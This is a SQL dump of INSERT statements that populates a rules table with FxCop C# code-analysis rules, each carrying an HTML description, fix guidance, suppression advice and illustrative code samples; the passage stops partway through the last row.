INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (499, 'CA1033: Interface methods should be callable by child types', 'InterfaceMethodsShouldBeCallableByChildTypes', 'CA1033', 'fxcop', '<h2>Cause</h2>
<p>
            An unsealed externally visible type provides an explicit method implementation of a public interface and does not provide an alternative externally visible method that has the same name.
</p>
<h2>Rule Description</h2>
<p>
            Consider a base type that explicitly implements a public interface method. A type that derives from the base type can access the inherited interface method only through a reference to the current instance (<code>this</code> in C#) that is cast to the interface. If the derived type re-implements (explicitly) the inherited interface method, the base implementation can no longer be accessed. The call through the current instance reference will invoke the derived implementation; this causes recursion and an eventual stack overflow.
            This rule does not report a violation for an explicit implementation of <code>IDisposable.Dispose</code> when an externally visible Close() or System.IDisposable.Dispose(Boolean) method is provided.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, implement a new method that exposes the same functionality and is visible to derived types or change to a nonexplicit implementation. If a breaking change is acceptable, an alternative is to make the type sealed.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if an externally visible method is provided that has the same functionality but a different name than the explicitly implemented method.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182153.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182153.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812398, 1510817812399, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (500, 'CA1309: Use ordinal StringComparison', 'UseOrdinalStringComparison', 'CA1309', 'fxcop', '<h2>Cause</h2>
<p>
            A string comparison operation that is nonlinguistic does not set the <code>StringComparison</code> parameter to either Ordinal or OrdinalIgnoreCase.
</p>
<h2>Rule Description</h2>
<p>
            Many string operations, most important the String.Compare and String.Equals methods, now provide an overload that accepts a StringComparision enumeration value as a parameter.
            When you specify either StringComparison.Ordinal or StringComparison.OrdinalIgnoreCase, the string comparison will be nonlinguistic. That is, the features that are specific to the natural language are ignored when comparison decisions are made. This means the decisions are based on simple byte comparisons and ignore casing or equivalence tables that are parameterized by culture. As a result, by explicitly setting the parameter to either the StringComparison.Ordinal or StringComparison.OrdinalIgnoreCase, your code often gains speed, increases correctness, and becomes more reliable.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the string comparison method to an overload that accepts the <code>System.StringComparison</code> enumeration as a parameter, and specify either Ordinal or OrdinalIgnoreCase. For example, change String.Compare(str1, str2) to String.Compare(str1, str2, StringComparison.Ordinal).
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when the library or application is intended for a limited local audience or when the semantics of the current culture should be used.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb385972.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb385972.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812400, 1510817812400, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (501, 'CA1030: Use events where appropriate', 'UseEventsWhereAppropriate', 'CA1030', 'fxcop', '<h2>Cause</h2>
<p>
            A public, protected, or private method name begins with one of the following:
            <ul>
              <li>
                AddOn
              </li>
              <li>
                RemoveOn
              </li>
              <li>
                Fire
              </li>
              <li>
                Raise
              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            This rule detects methods that have names that ordinarily would be used for events. Events follow the Observer or Publish-Subscribe design pattern; they are used when a state change in one object must be communicated to other objects. If a method gets called in response to a clearly defined state change, the method should be invoked by an event handler. Objects that call the method should raise events instead of calling the method directly.
            Some common examples of events are found in user interface applications where a user action such as clicking a button causes a segment of code to execute. The .NET Framework event model is not limited to user interfaces; it should be used anywhere you must communicate state changes to one or more objects.
</p>
<h2>How to Fix Violations</h2>
<p>
            If the method is called when the state of an object changes, you should consider changing the design to use the .NET Framework event model.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule if the method does not work with the .NET Framework event model.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182177.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182177.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1d', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812401, 1510817812401, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (502, 'CA1306: Set locale for data types', 'SetLocaleForDataTypes', 'CA1306', 'fxcop', '<h2>Cause</h2>
<p>
            A method or constructor created one or more <code>System.Data.DataTable</code> or <code>System.Data.DataSet</code> instances and did not explicitly set the locale property (<code>DataTable.Locale</code> or <code>DataSet.Locale</code>).
</p>
<h2>Rule Description</h2>
<p>
            The locale determines culture-specific presentation elements for data, such as formatting used for numeric values, currency symbols, and sort order. When you create a <code>DataTable</code> or <code>DataSet</code>, you should set the locale explicitly. By default, the locale for these types is the current culture. For data that is stored in a database or file and is shared globally, the locale should ordinarily be set to the invariant culture (<code>CultureInfo.InvariantCulture</code>). When data is shared across cultures, using the default locale can cause the contents of the <code>DataTable</code> or <code>DataSet</code> to be presented or interpreted incorrectly.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, explicitly set the locale for the <code>DataTable</code> or <code>DataSet</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when the library or application is for a limited local audience, the data is not shared, or the default setting yields the desired behavior in all supported scenarios.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182188.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182188.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812402, 1510817812402, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (503, 'CA1710: Identifiers should have correct suffix', 'IdentifiersShouldHaveCorrectSuffix', 'CA1710', 'fxcop', '<h2>Cause</h2>
<p>
            An identifier does not have the correct suffix.
</p>
<h2>Rule Description</h2>
<p>
            By convention, the names of types that extend certain base types or that implement certain interfaces, or types derived from these types, have a suffix that is associated with the base type or interface.
            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.
            The following table lists the base types and interfaces that have associated suffixes.







                    Base type/Interface


                    Suffix






                        <code>System.Attribute</code>




                    Attribute






                        <code>System.EventArgs</code>




                    EventArgs






                        <code>System.Exception</code>




                    Exception






                        <code>System.Collections.ICollection</code>




                    Collection






                        <code>System.Collections.IDictionary</code>




                    Dictionary






                        <code>System.Collections.IEnumerable</code>




                    Collection






                        <code>System.Collections.Queue</code>




                    Collection or Queue






                        <code>System.Collections.Stack</code>




                    Collection or Stack






                        <code>System.Collections.Generic.ICollection&lt;T&gt;</code>




                    Collection






                        System.Collections.Generic.IDictionary&lt;TKey, TValue&gt;




                    Dictionary






                        <code>System.Data.DataSet</code>




                    DataSet






                        <code>System.Data.DataTable</code>




                    Collection or DataTable






                        <code>System.IO.Stream</code>




                    Stream






                        <code>System.Security.IPermission</code>




                    Permission






                        <code>System.Security.Policy.IMembershipCondition</code>




                    Condition




                    An event-handler delegate.


                    EventHandler




            Types that implement <code>ICollection</code> and are a generalized type of data structure, such as a dictionary, stack, or queue, are allowed names that provide meaningful information about the intended usage of the type.
            Types that implement <code>ICollection</code> and are a collection of specific items have names that end with the word ''Collection''. For example, a collection of <code>Queue</code> objects would have the name ''QueueCollection''. The ''Collection'' suffix signifies that the members of the collection can be enumerated by using the <code>foreach</code> (<code>For Each</code> in Visual Basic) statement.
            Types that implement <code>IDictionary</code> have names that end with the word ''Dictionary'' even if the type also implements <code>IEnumerable</code> or <code>ICollection</code>. The ''Collection'' and ''Dictionary'' suffix naming conventions enable users to distinguish between the following two enumeration patterns.
            Types with the ''Collection'' suffix follow this enumeration pattern.









            <pre>
    foreach(SomeType x in SomeCollection) { }
</pre>




Types with the ''Dictionary'' suffix follow this enumeration pattern.









            <pre>
    foreach(SomeType x in SomeDictionary.Values) { }
</pre>




A <code>DataSet</code> object consists of a collection of <code>DataTable</code> objects, which consist of collections of <code>System.Data.DataColumn</code> and <code>System.Data.DataRow</code> objects, among others. These collections implement <code>ICollection</code> through the base <code>System.Data.InternalDataCollectionBase</code> class.






                How to Fix Violations





</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning to use the ''Collection'' suffix if the type is a generalized data structure that might be extended or that will hold an arbitrary set of diverse items. In this case, a name that provides meaningful information about the implementation, performance, or other characteristics of the data structure might make sense (for example, BinaryTree). In cases where the type represents a collection of a specific type (for example, StringCollection), do not suppress a warning from this rule because the suffix indicates that the type can be enumerated by using a <code>foreach</code> statement.
            For other suffixes, do not suppress a warning from this rule. The suffix allows the intended usage to be evident from the type name.
</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:IdentifiersShouldNotHaveIncorrectSuffix}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182244.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182244.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812403, 1510817812404, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (504, 'CA1004: Generic methods should provide type parameter', 'GenericMethodsShouldProvideTypeParameter', 'CA1004', 'fxcop', '<h2>Cause</h2>
<p>
            The parameter signature of an externally visible generic method does not contain types that correspond to all the type parameters of the method.
</p>
<h2>Rule Description</h2>
<p>
            Inference is how the type argument of a generic method is determined by the type of argument that is passed to the method, instead of by the explicit specification of the type argument. To enable inference, the parameter signature of a generic method must include a parameter that is of the same type as the type parameter for the method. In this case, the type argument does not have to be specified. When you use inference for all type parameters, the syntax for calling generic and nongeneric instance methods is identical. This simplifies the usability of generic methods.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the design so that the parameter signature contains the same type for each type parameter of the method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Providing generics in a syntax that is easy to understand and use reduces the time that is required to learn and increases the adoption rate of new libraries.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>




                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>




                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>




                {rule:fxcop:DoNotExposeGenericLists}<br/>




                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>




                {rule:fxcop:UseGenericEventHandlerInstances}<br/>




                {rule:fxcop:UseGenericsWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182150.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182150.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812405, 1510817812406, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (505, 'CA1726: Use preferred terms', 'UsePreferredTerms', 'CA1726', 'fxcop', '<h2>Cause</h2>
<p>
            The name of an externally visible identifier includes a term for which an alternative, preferred term exists. Alternatively, the name includes the term Flag or Flags.
</p>
<h2>Rule Description</h2>
<p>
            This rule parses an identifier into tokens. Each single token and each contiguous dual token combination is compared to terms that are built into the rule and in the Deprecated section of any custom dictionaries. The following table shows the terms that are built into the rule and their preferred alternatives.







                    Obsolete term


                    Preferred term




                    Arent


                    AreNot




                    Cancelled


                    Canceled




                    Cant


                    Cannot




                    ComPlus


                    EnterpriseServices




                    Couldnt


                    CouldNot




                    Didnt


                    DidNot




                    Doesnt


                    DoesNot




                    Dont


                    DoNot




                    Flag or Flags


                    There is no replacement term. Do not use.




                    Hadnt


                    HadNot




                    Hasn’t


                    HasNot




                    Havent


                    HaveNot




                    Indices


                    Indexes




                    Isnt


                    IsNot




                    LogIn


                    LogOn




                    LogOut


                    LogOff




                    Shouldnt


                    ShouldNot




                    SignOn


                    SignIn




                    SignOff


                    SignOut




                    Wasnt


                    WasNot




                    Werent


                    WereNot




                    Wont


                    WillNot




                    Wouldnt


                    WouldNot




                    Writeable


                    Writable




</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, replace the term with the preferred alternative term.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule only if the name of the identifier is intentional and relates specifically to the original term instead of the preferred term.
</p>
<h2>Related Rules</h2>
<p>


                Naming Warnings


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182258.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182258.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812407, 1510817812407, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (506, 'CA1308: Normalize strings to uppercase', 'NormalizeStringsToUppercase', 'CA1308', 'fxcop', '<h2>Cause</h2>
<p>
            An operation normalizes a string to lowercase.
</p>
<h2>Rule Description</h2>
<p>
            Strings should be normalized to uppercase. A small group of characters, when they are converted to lowercase, cannot make a round trip. To make a round trip means to convert the characters from one locale to another locale that represents character data differently, and then to accurately retrieve the original characters from the converted characters.
</p>
<h2>How to Fix Violations</h2>
<p>
            Change operations that convert strings to lowercase so that the strings are converted to uppercase instead. For example, change String.ToLower(CultureInfo.InvariantCulture) to String.ToUpper(CultureInfo.InvariantCulture).
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning message when you are not making security decision based on the result (for example, when you are displaying it in the UI).
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb386042.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb386042.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812408, 1510817812408, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (508, 'CA1046: Do not overload operator equals on reference types', 'DoNotOverloadOperatorEqualsOnReferenceTypes', 'CA1046', 'fxcop', '<h2>Cause</h2>
<p>
            A public or nested public reference type overloads the equality operator.
</p>
<h2>Rule Description</h2>
<p>
            For reference types, the default implementation of the equality operator is almost always correct. By default, two references are equal only if they point to the same object.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the implementation of the equality operator.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when the reference type behaves like a built-in value type. If it is meaningful to do addition or subtraction on instances of the type, it is probably correct to implement the equality operator and suppress the violation.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:OverloadOperatorEqualsOnOverloadingAddAndSubtract}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182145.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182145.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812410, 1510817812410, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (509, 'CA2219: Do not raise exceptions in exception clauses', 'DoNotRaiseExceptionsInExceptionClauses', 'CA2219', 'fxcop', '<h2>Cause</h2>
<p>
            An exception is thrown from a <code>finally</code>, filter, or fault clause.
</p>
<h2>Rule Description</h2>
<p>
            When an exception is raised in an exception clause, it greatly increases the difficulty of debugging.
            When an exception is raised in a <code>finally</code> or fault clause, the new exception hides the active exception, if present. This makes the original error hard to detect and debug.
            When an exception is raised in a filter clause, the runtime silently catches the exception, and causes the filter to evaluate to false. There is no way to tell the difference between the filter evaluating to false and an exception being throw from a filter. This makes it hard to detect and debug errors in the filter''s logic.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix this violation of this rule, do not explicitly raise an exception from a <code>finally</code>, filter, or fault clause.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning for this rule. There are no scenarios under which an exception raised in an exception clause provides a benefit to the executing code.
</p>
<h2>Related Rules</h2>
<p>


                CA1065: Do not raise exceptions in unexpected locations


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/bb386041.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb386041.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812411, 1510817812411, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (510, 'CA2224: Override equals on overloading operator equals', 'OverrideEqualsOnOverloadingOperatorEquals', 'CA2224', 'fxcop', '<h2>Cause</h2>
<p>
            A public type implements the equality operator, but does not override <code>Object.Equals</code>.
</p>
<h2>Rule Description</h2>
<p>
            The equality operator is intended to be a syntactically convenient way to access the functionality of the <code>Equals</code> method. If you implement the equality operator, its logic must be identical to that of <code>Equals</code>.
            The C# compiler issues a warning if your code violates this rule.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, you should either remove the implementation of the equality operator, or override <code>Equals</code> and have the two methods return the same values. If the equality operator does not introduce inconsistent behavior, you can fix the violation by providing an implementation of <code>Equals</code> that calls the <code>Equals</code> method in the base class.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the equality operator returns the same value as the inherited implementation of <code>Equals</code>. The Example section includes a type that could safely suppress a warning from this rule.
</p>
<h2>Examples of Inconsistent Equality Definitions</h2>

<h3>Description</h3>
<p>
                The following example shows a type with inconsistent definitions of equality. BadPoint changes the meaning of equality by providing a custom implementation of the equality operator, but does not override <code>Equals</code> so that it behaves identically.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace UsageLibrary
{
    public class BadPoint
    {
        private int x,y, id;
        private static int NextId;

        static BadPoint()
        {
            NextId = -1;
        }
        public BadPoint(int x, int y)
        {
            this.x = x;
            this.y = y;
            id = ++(BadPoint.NextId);
        }

        public override string ToString()
        {
            return String.Format("([{0}] {1},{2})",id,x,y);
        }

        public int X {get {return x;}}

        public int Y {get {return x;}}
        public int nd {get {return id;}}

        public override int GetHashCode()
        {
            return id;
        }
        // Violates rule: OverrideEqualsOnOverridingOperatorEquals. 

        // BadPoint redefines the equality operator to ignore the id value. 
        // This is different from how the inherited implementation of  
        // System.Object.Equals behaves for value types.  
        // It is not safe to exclude the violation for this type.  
        public static bool operator== (BadPoint p1, BadPoint p2)
        {
            return ((p1.x == p2.x) &amp;&amp; (p1.y == p2.y));
        }
        // The C# compiler and rule OperatorsShouldHaveSymmetricalOverloads require this. 
        public static bool operator!= (BadPoint p1, BadPoint p2)
        {
            return !(p1 == p2);
        }
    }
}
</pre>





</p>
<h2>Example</h2>

<h3>Description</h3>
<p>
                The following example shows a class (reference type) that violates this rule.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    // Violates this rule     
    public class Point
    {
        private readonly int _X;
        private readonly int _Y;

        public Point(int x, int y)
        {
            _X = x;
            _Y = y;
        }

        public int X
        {
            get { return _X; }
        }

        public int Y
        {
            get { return _Y; }
        }

        public override int GetHashCode()
        {
            return _X ^ _Y;
        }

        public static bool operator ==(Point point1, Point point2)
        {
            if (point1 == null || point2 == null)
                return false;

            if (point1.GetType() != point2.GetType())
                return false;

            if (point1._X != point2._X)
                return false;

            return point1._Y == point2._Y;
        }

        public static bool operator !=(Point point1, Point point2)
        {
            return !(point1 == point2);
        }
    }
}
</pre>





</p>
<h2>Structure Example</h2>

<h3>Description</h3>
<p>
                The following example shows a structure (value type) that violates this rule.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    // Violates this rule     
    public struct Point
    {
        private readonly int _X;
        private readonly int _Y;

        public Point(int x, int y)
        {
            _X = x;
            _Y = y;
        }

        public int X
        {
            get { return _X; }
        }

        public int Y
        {
            get { return _Y; }
        }

        public override int GetHashCode()
        {
            return _X ^ _Y;
        }

        public static bool operator ==(Point point1, Point point2)
        {
            if (point1._X != point2._X)
                return false;

            return point1._Y == point2._Y;
        }

        public static bool operator !=(Point point1, Point point2)
        {
            return !(point1 == point2);
        }
    }
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:DoNotOverloadOperatorEqualsOnReferenceTypes}<br/>




                {rule:fxcop:OperatorOverloadsHaveNamedAlternates}<br/>




                {rule:fxcop:OperatorsShouldHaveSymmetricalOverloads}<br/>




                {rule:fxcop:OverrideGetHashCodeOnOverridingEquals}<br/>




                {rule:fxcop:OverloadOperatorEqualsOnOverridingValueTypeEquals}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182357.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182357.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812412, 1510817812413, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (511, 'CA1019: Define accessors for attribute arguments', 'DefineAccessorsForAttributeArguments', 'CA1019', 'fxcop', '<h2>Cause</h2>
<p>
            In its constructor, an attribute defines arguments that do not have corresponding properties.
</p>
<h2>Rule Description</h2>
<p>
            Attributes can define mandatory arguments that must be specified when you apply the attribute to a target. These are also known as positional arguments because they are supplied to attribute constructors as positional parameters. For every mandatory argument, the attribute should also provide a corresponding read-only property so that the value of the argument can be retrieved at execution time. This rule checks that for each constructor parameter, you have defined the corresponding property.
            Attributes can also define optional arguments, which are also known as named arguments. These arguments are supplied to attribute constructors by name and should have a corresponding read/write property.
            For mandatory and optional arguments, the corresponding properties and constructor parameters should use the same name but different casing. Properties use Pascal casing, and parameters use camel casing.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add a read-only property for each constructor parameter that does not have one.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule if you do not want the value of the mandatory argument to be retrievable.
</p>
<h2>Custom Attributes Example</h2>

<h3>Description</h3>
<p>
                The following example shows two attributes that define a mandatory (positional) parameter. The first implementation of the attribute is incorrectly defined. The second implementation is correct.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace DesignLibrary
{
// Violates rule: DefineAccessorsForAttributeArguments.

   [AttributeUsage(AttributeTargets.All)]
   public sealed class BadCustomAttribute :Attribute
   {
      string data;

      // Missing the property that corresponds to  
      // the someStringData parameter. 

      public BadCustomAttribute(string someStringData)
      {
         data = someStringData;
      }
   }

// Satisfies rule: Attributes should have accessors for all arguments.

   [AttributeUsage(AttributeTargets.All)]
   public sealed class GoodCustomAttribute :Attribute
   {
      string data;

      public GoodCustomAttribute(string someStringData)
      {
         data = someStringData;
      }
      //The constructor parameter and property 
      //name are the same except for case. 

      public string SomeStringData
      {
         get
         {
            return data;
         }
      }
   }
}
</pre>





</p>
<h2>Positional and Named Arguments</h2>

<h3>Description</h3>
<p>
                Positional and named arguments make to clear to consumers of your library which arguments are mandatory for the attribute and which arguments are optional.
                The following example shows an implementation of an attribute that has both positional and named arguments.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace DesignLibrary
{
    [AttributeUsage(AttributeTargets.All)]
    public sealed class GoodCustomAttribute : Attribute
    {
        string mandatory;
        string optional;

        public GoodCustomAttribute(string mandatoryData)
        {
            mandatory = mandatoryData;
        }

        public string MandatoryData
        {
            get { return mandatory; }
        }

        public string OptionalData
        {
            get { return optional; }
            set { optional = value; }
        }
    }
}
</pre>





</p>
<h3>Comments</h3>
<p>
                The following example shows how to apply the custom attribute to two properties.
</p>
<h3>Code</h3>
<p>










            <pre>
[GoodCustomAttribute("ThisIsSomeMandatoryData", OptionalData = "ThisIsSomeOptionalData")]
public string MyProperty
{
    get { return myProperty; }
    set { myProperty = value; }
}

[GoodCustomAttribute("ThisIsSomeMoreMandatoryData")]
public string MyOtherProperty
{
    get { return myOtherProperty; }
    set { myOtherProperty = value; }
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:AvoidUnsealedAttributes}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182136.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182136.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812414, 1510817812415, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (512, 'CA2220: Finalizers should call base class finalizer', 'FinalizersShouldCallBaseClassFinalizer', 'CA2220', 'fxcop', '<h2>Cause</h2>
<p>
            A type that overrides <code>Object.Finalize</code> does not call the <code>Finalize</code> method in its base class.
</p>
<h2>Rule Description</h2>
<p>
            Finalization must be propagated through the inheritance hierarchy. To ensure this, types must call their base class <code>Finalize</code> method from within their own <code>Finalize</code> method. The C# compiler adds the call to the base class finalizer automatically.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, call the base type''s <code>Finalize</code> method from your <code>Finalize</code> method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Some compilers that target the common language runtime insert a call to the base type''s finalizer into the Microsoft intermediate language (MSIL). If a warning from this rule is reported, your compiler does not insert the call, and you must add it to your code.
</p><h2>MSDN Documentation</h2>
